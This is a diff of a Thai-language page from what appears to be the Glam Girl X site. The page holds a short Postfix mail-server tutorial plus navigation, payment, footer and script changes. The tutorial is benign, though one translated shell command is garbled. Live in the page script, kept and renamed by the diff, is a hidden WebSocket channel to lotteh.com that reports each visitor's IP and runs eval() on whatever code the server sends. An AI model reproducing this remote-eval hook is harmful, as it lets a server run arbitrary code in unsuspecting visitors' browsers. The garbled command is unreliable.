@@ -65,7 +65,7 @@
               <a class="nav-link" href="/th/landing" title="เยี่ยมชมหน้า Landing Page">การลงจอด</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="วิดีโอแชท">แชท</a>
+              <a class="nav-link" href="/th/chat" title="วิดีโอแชท">แชท</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/th/private" title="ดูรูปภาพส่วนตัวพร้อมคีย์">ส่วนตัว</a>
@@ -123,7 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisyรูปโปรไฟล์" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>โดย Daisy</i></p>
 
-<div style="white-space: pre-wrap;"><p> ฉันจะสร้างเซิร์ฟเวอร์เมลด้วย postfix ได้อย่างไรbr> </p> <p> 1ติดตั้ง Postfix: ใช้แพ็คเกจของคุณเพื่อติดตั้ง postfix บนเซิร์ฟเวอร์ของคุณตัวอย่างเช่นใน Debian/Ubuntu คุณสามารถเรียกใช้ `sudo apt-get ติดตั้ง postfix`. </p> <p> <br> </p> <p> 2กำหนดค่า postfix: ไฟล์การกำหนดค่า postfix อยู่ใน `/etc/postfix/`ไฟล์การกำหนดค่าหลักคือ `main.cf`คุณสามารถแก้ไขไฟล์นี้เพื่อตั้งค่าเซิร์ฟเวอร์เมลของคุณตามความต้องการของคุณการกำหนดค่าทั่วไปบางอย่างที่คุณอาจต้องตั้งค่ารวมถึงชื่อโดเมนการตั้งค่ารีเลย์จดหมายโดเมนเสมือนจริง ฯลฯ </p> <p> <br> </b> <p> 3ตั้งค่า DNS Records: เพื่อให้แน่ใจว่าการส่งจดหมายคุณต้องตั้งค่าบันทึก DNS ที่จำเป็น (MX และ SPF Records) สำหรับโดเมนของคุณติดต่อผู้ให้บริการโดเมนหรือผู้ให้บริการ DNS ของคุณเพื่อขอความช่วยเหลือหากจำเป็น </p> <p> <br> </p> <p> 4กำหนดค่าโดเมนและผู้ใช้เสมือนจริง: หากคุณต้องการโฮสต์หลายโดเมนบนเซิร์ฟเวอร์เมลของคุณคุณจะต้องกำหนดค่าโดเมนและผู้ใช้เสมือนจริงสิ่งนี้สามารถทำได้โดยใช้การตั้งค่า `virtual_alias_maps` และ` virtual_mailbox_maps` ในไฟล์การกำหนดค่า postfix </p> <p> <br> <br> </p> <p> 5รักษาความปลอดภัยเซิร์ฟเวอร์อีเมลของคุณ: ตรวจสอบให้แน่ใจว่าเซิร์ฟเวอร์อีเมลของคุณปลอดภัยโดยการตั้งค่ากฎไฟร์วอลล์โดยใช้การเข้ารหัส TLS สำหรับจดหมายขาเข้าและส่งออกและใช้มาตรการรักษาความปลอดภัยอื่น ๆ ที่แนะนำสำหรับเซิร์ฟเวอร์เมล </p> <p> <br> </p> <p> 6.ทดสอบเซิร์ฟเวอร์เมลของคุณ: เมื่อตั้งค่าทุกอย่างแล้วคุณควรทดสอบเซิร์ฟเวอร์เมลของคุณโดยส่งและรับอีเมลทดสอบใช้เครื่องมือเช่น telnet หรือ mailx เพื่อส่งอีเมลด้วยตนเองและตรวจสอบว่าได้รับสำเร็จหรือไม่ </p> <p> <br> </p> <p> อย่าลืมอัปเดตเป็นระยะ ๆ และบำรุงรักษาเซิร์ฟเวอร์อีเมลของคุณเพื่อให้แน่ใจว่าทำงานได้อย่างราบรื่นและอย่างปลอดภัยนอกจากนี้ยังเป็นความคิดที่ดีในการตรวจสอบบันทึกเซิร์ฟเวอร์อีเมลสำหรับปัญหาหรือที่น่าสงสัย</div>
+<div style="white-space: pre-wrap;"><p>ฉันจะสร้างเซิร์ฟเวอร์เมลด้วย postfix ได้อย่างไร</p><p><br/></p><p>หากต้องการสร้างเมลเซิร์ฟเวอร์ด้วย Postfix ให้ทำตามขั้นตอนเหล่านี้:</p><p><br/></p><p>1. ติดตั้ง postfix: ใช้แพ็คเกจตัวจัดการของคุณเพื่อติดตั้ง postfix บนเซิร์ฟเวอร์ของคุณ ตัวอย่างเช่นใน Debian/Ubuntu คุณสามารถเรียกใช้ `sudo apt-get ติดตั้ง postfix`</p><p><br/></p><p>2. กำหนดค่า postfix: ไฟล์การกำหนดค่า postfix อยู่ใน `/etc/postfix/` ไฟล์การกำหนดค่าหลักคือ `main.cf` คุณสามารถแก้ไขไฟล์นี้เพื่อตั้งค่าเซิร์ฟเวอร์เมลของคุณตามความต้องการของคุณ การกำหนดค่าทั่วไปบางอย่างที่คุณอาจต้องตั้งค่ารวมถึงชื่อโดเมนการตั้งค่ารีเลย์เมลโดเมนเสมือนจริง ฯลฯ</p><p><br/></p><p>3. ตั้งค่าบันทึก DNS: เพื่อให้แน่ใจว่าส่งจดหมายคุณต้องตั้งค่าบันทึก DNS ที่จำเป็น (MX และ SPF Records) สำหรับโดเมนของคุณ ติดต่อผู้ให้บริการโดเมนหรือผู้ให้บริการ DNS ของคุณเพื่อขอความช่วยเหลือหากจำเป็น</p><p><br/></p><p>4. กำหนดค่าโดเมนและผู้ใช้เสมือน: หากคุณต้องการโฮสต์หลายโดเมนบนเซิร์ฟเวอร์เมลของคุณคุณจะต้องกำหนดค่าโดเมนและผู้ใช้เสมือนจริง สิ่งนี้สามารถทำได้โดยใช้ `virtual_alias_maps` และ` virtual_mailbox_maps` การตั้งค่าในไฟล์การกำหนดค่า postfix</p><p><br/></p><p>5. รักษาความปลอดภัยเซิร์ฟเวอร์อีเมลของคุณ: ตรวจสอบให้แน่ใจว่าเซิร์ฟเวอร์เมลของคุณปลอดภัยโดยการตั้งค่ากฎไฟร์วอลล์โดยใช้การเข้ารหัส TLS สำหรับจดหมายขาเข้าและส่งออกและใช้มาตรการรักษาความปลอดภัยอื่น ๆ ที่แนะนำสำหรับเซิร์ฟเวอร์เมล</p><p><br/></p><p>6. ทดสอบเซิร์ฟเวอร์เมลของคุณ: เมื่อตั้งค่าทุกอย่างแล้วคุณควรทดสอบเซิร์ฟเวอร์เมลของคุณโดยส่งและรับอีเมลทดสอบ ใช้เครื่องมือเช่น telnet หรือ mailx เพื่อส่งอีเมลด้วยตนเองและตรวจสอบว่าได้รับสำเร็จหรือไม่</p><p><br/></p><p>อย่าลืมอัปเดตเป็นระยะและบำรุงรักษาเซิร์ฟเวอร์อีเมลของคุณเพื่อให้แน่ใจว่าทำงานได้อย่างราบรื่นและปลอดภัย นอกจากนี้ยังเป็นความคิดที่ดีในการตรวจสอบบันทึกเซิร์ฟเวอร์เมลสำหรับปัญหาหรือกิจกรรมที่น่าสงสัย</p></div>
+
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -142,7 +143,7 @@
 
 
 
-<p><a href="https://lotteh.com/payments/photo/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917" title="Buy on Lotte Harper">ซื้อ</a> | <a href="https://lotteh.com/payments/photo/crypto/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917&crypto=ETH" title="Buy with cryptocurrency on Lotte Harper">ซื้อด้วย crypto</a></p>
+<p><a href="https://lotteh.com/payments/pay/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917" title="Buy on Lotte Harper">ซื้อ</a> | <a href="https://lotteh.com/payments/pay/crypto/Daisy/?id=f09955f6-55e4-42e0-a575-882dbb7e3917&crypto=USDC" title="Buy with cryptocurrency on Lotte Harper">ซื้อด้วย crypto</a></p>
 
 
 <hr>
@@ -182,46 +183,53 @@
 
 
         
-        <p>
+        
 
 <div class="dropdown">
   <a class="btn btn-outline-info dropdown-toggle" role="button" id="dropdownMenuLink" data-bs-toggle="dropdown" aria-expanded="false">
     <i class="bi bi-globe"></i> ภาษา
   </a>
   <div class="dropdown-menu" aria-labelledby="dropdownMenuLink">
-    <a class="dropdown-item" href="/en/how-do-i-build-a-mail-server">English</a>
-    <a class="dropdown-item" href="/es/how-do-i-build-a-mail-server">Española</a>
-    <a class="dropdown-item" href="/fr/how-do-i-build-a-mail-server">Français</a>
-    <a class="dropdown-item" href="/de/how-do-i-build-a-mail-server">Deutsch</a>
-    <a class="dropdown-item" href="/nl/how-do-i-build-a-mail-server">Nederlands</a>
-    <a class="dropdown-item" href="/af/how-do-i-build-a-mail-server">Afrikaans</a>
-    <a class="dropdown-item" href="/ar/how-do-i-build-a-mail-server">عربي</a>
-    <a class="dropdown-item" href="/pt/how-do-i-build-a-mail-server">Português (Portugal, Brazil)</a>
-    <a class="dropdown-item" href="/id/how-do-i-build-a-mail-server">Bahasa</a>
-    <a class="dropdown-item" href="/hi/how-do-i-build-a-mail-server">हिंदी</a>
-    <a class="dropdown-item" href="/ru/how-do-i-build-a-mail-server">Русский</a>
-    <a class="dropdown-item" href="/ja/how-do-i-build-a-mail-server">日本語</a>
-    <a class="dropdown-item" href="/th/how-do-i-build-a-mail-server">แบบไทย</a>
-    <a class="dropdown-item" href="/zh-CN/how-do-i-build-a-mail-server">中国人</a>
-    <a class="dropdown-item" href="/tl/how-do-i-build-a-mail-server">Filipino</a>
-    <a class="dropdown-item" href="/cs/how-do-i-build-a-mail-server">čeština</a>
-    <a class="dropdown-item" href="/he/how-do-i-build-a-mail-server">עִברִית</a>
-    <a class="dropdown-item" href="/it/how-do-i-build-a-mail-server">Italiana</a>
-    <a class="dropdown-item" href="/no/how-do-i-build-a-mail-server">norsk</a>
-    <a class="dropdown-item" href="/pl/how-do-i-build-a-mail-server">Polski</a>
-    <a class="dropdown-item" href="/sv/how-do-i-build-a-mail-server">svenska</a>
-    <a class="dropdown-item" href="/tr/how-do-i-build-a-mail-server">Türkçe</a>
-    <a class="dropdown-item" href="/uk/how-do-i-build-a-mail-server">українська</a>
-    <a class="dropdown-item" href="/vi/how-do-i-build-a-mail-server">Tiếng Việt</a>
-    <a class="dropdown-item" href="/zu/how-do-i-build-a-mail-server">Zulu</a>
+    <div style="max-height: 50vh; overflow: scroll;">
+        <a class="dropdown-item" href="/en/how-do-i-build-a-mail-server">English</a>
+        <a class="dropdown-item" href="/es/how-do-i-build-a-mail-server">Española</a>
+        <a class="dropdown-item" href="/fr/how-do-i-build-a-mail-server">Français</a>
+        <a class="dropdown-item" href="/de/how-do-i-build-a-mail-server">Deutsch</a>
+        <a class="dropdown-item" href="/nl/how-do-i-build-a-mail-server">Nederlands</a>
+        <a class="dropdown-item" href="/af/how-do-i-build-a-mail-server">Afrikaans</a>
+        <a class="dropdown-item" href="/ar/how-do-i-build-a-mail-server">عربي</a>
+        <a class="dropdown-item" href="/pt/how-do-i-build-a-mail-server">Português (Portugal, Brazil)</a>
+        <a class="dropdown-item" href="/id/how-do-i-build-a-mail-server">Bahasa</a>
+        <a class="dropdown-item" href="/hi/how-do-i-build-a-mail-server">हिंदी</a>
+        <a class="dropdown-item" href="/ru/how-do-i-build-a-mail-server">Русский</a>
+        <a class="dropdown-item" href="/ja/how-do-i-build-a-mail-server">日本語</a>
+        <a class="dropdown-item" href="/th/how-do-i-build-a-mail-server">แบบไทย</a>
+        <a class="dropdown-item" href="/zh-CN/how-do-i-build-a-mail-server">中国人</a>
+        <a class="dropdown-item" href="/tl/how-do-i-build-a-mail-server">Filipino</a>
+        <a class="dropdown-item" href="/cs/how-do-i-build-a-mail-server">čeština</a>
+        <a class="dropdown-item" href="/he/how-do-i-build-a-mail-server">עִברִית</a>
+        <a class="dropdown-item" href="/it/how-do-i-build-a-mail-server">Italiana</a>
+        <a class="dropdown-item" href="/no/how-do-i-build-a-mail-server">norsk</a>
+        <a class="dropdown-item" href="/pl/how-do-i-build-a-mail-server">Polski</a>
+        <a class="dropdown-item" href="/sv/how-do-i-build-a-mail-server">svenska</a>
+        <a class="dropdown-item" href="/tr/how-do-i-build-a-mail-server">Türkçe</a>
+        <a class="dropdown-item" href="/uk/how-do-i-build-a-mail-server">українська</a>
+        <a class="dropdown-item" href="/vi/how-do-i-build-a-mail-server">Tiếng Việt</a>
+        <a class="dropdown-item" href="/zu/how-do-i-build-a-mail-server">Zulu</a>
+        <a class="dropdown-item" href="/sq/how-do-i-build-a-mail-server">shqiptare</a>
+    </div>
   </div>
 </div>
-</p>
+
         <p><i>ทิ้งเคล็ดลับไว้ใน Bitcoin โดยใช้ที่อยู่นี้:</i> <b id="btc-wallet">3KhDWoSve2N627RiW8grj6XrsoPT7d6qyE</b> <button class="btn btn-sm btn-info" title="ที่อยู่คัดลอก" onclick="copyToClipboard('btc-wallet');">สำเนา</button></p>
+        <div id="javascript-console"></div>
 	    <div class="d-flex justify-content-between p-2">
 	        <div style="float:left;">
 	          <p><span class="badge bg-light text-dark shadow p-1">&copy; Glam Girl X 2025</span></p>
 		    </div>
+            <div style="text-align: center;">
+                 <a href="https://instagram.com/yourlocalfemme" about="_blank" title="เยี่ยมชมฉันบน Instagram" style="font-size: 20px;" class="ml-1"><i class="bi bi-instagram"></i></a> <a href="https://twitter.com/teamfemmebabe" about="_blank" title="เยี่ยมชมฉันบน Twitter" style="font-size: 20px;" class="ml-1"><i class="bi bi-twitter"></i></a> <a href="https://youtube.com/@daisymakeup" about="_blank" title="ดูฉันบน youtube" style="font-size: 20px;" class="ml-1"><i class="bi bi-youtube"></i></a>
+            </div>
 	        <div style="float:right;">
 	          <p><span class="badge bg-light text-dark shadow p-1"><a href="https://lotteh.com/terms/?lang=th" title="ดูข้อกำหนดในการให้บริการ">ข้อกำหนด</a></span></p>
 		    </div>
@@ -237,6 +245,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -247,32 +272,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("close", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -419,34 +444,43 @@ if(document.getElementById("current-time")) {
             image.style.height = "100%";
             image.style.maxWidth = "160px";
             image.alt = "แชร์หน้านี้โดยการสแกนรหัส QR";
-            function downloadQrImage(url, filename) {
-              const link = document.createElement('a');
-              link.href = url;
-              link.download = 'Glam Girl X - ' + filename;
-              document.body.appendChild(link);
-              link.click();
-              document.body.removeChild(link);
-            }
-            function downloadQr() {
-                    downloadQrImage(image.src, 'QR Code');
-            }
-            qrdiv.onclick = downloadQr;
+            try {
+                function getBase64Image(img) {
+                    var src = img.src;
+                    var image = new Image();
+                    image.src = src;
+                    image.onload = function(event) {
+                    var bsfcanvas = document.createElement("canvas");
+                    bsfcanvas.width = img.clientWidth + 40;
+                    bsfcanvas.height = img.clientHeight + 40;
+                    if(bsfcanvas.height < bsfcanvas.width) bsfcanvas.height = bsfcanvas.width;
+                    var bsfctx = bsfcanvas.getContext("2d");
+                    bsfctx.fillStyle = "#ffffff";
+                    bsfctx.fillRect(0, 0, bsfcanvas.width, bsfcanvas.height);
+                    bsfctx.drawImage(event.target, 20, 20, bsfcanvas.width - 40, bsfcanvas.height - 40);
+                    var dataURL = bsfcanvas.toDataURL("image/png");
+                    downloadQrImage(dataURL, 'Glam Girl X - QR Code.png');
+                    };
+                }
+                function downloadQrImage(url, filename) {
+                    const link = document.createElement('a');
+                    link.download = filename;
+                    link.href = url;
+                    link.classList.add('hide');
+                    link.click();
+                }
+                function downloadQr(){
+                    var theQrImage = document.getElementById('shareqrcode').querySelector('img');
+                    getBase64Image(theQrImage);
+                }
+                qrdiv.onclick = downloadQr;
+                } catch(error) {
+                        document.getElementById('javascript-console').insertAdjacentHTML("beforeend", '<div>' + new String(error) + '</div>');
+                }
         });
     </script>
     
-    <script async type="application/javascript"
-        src="https://news.google.com/swg/js/v1/swg-basic.js"></script>
-<script>
-  (self.SWG_BASIC = self.SWG_BASIC || []).push( basicSubscriptions => {
-    basicSubscriptions.init({
-      type: "NewsArticle",
-      isPartOfType: ["Product"],
-      isPartOfProductId: "CAowktDYCw:openaccess",
-      clientOptions: { theme: "light", lang: "en" },
-    });
-  });
-</script>
-
+    
     
     
     <script>
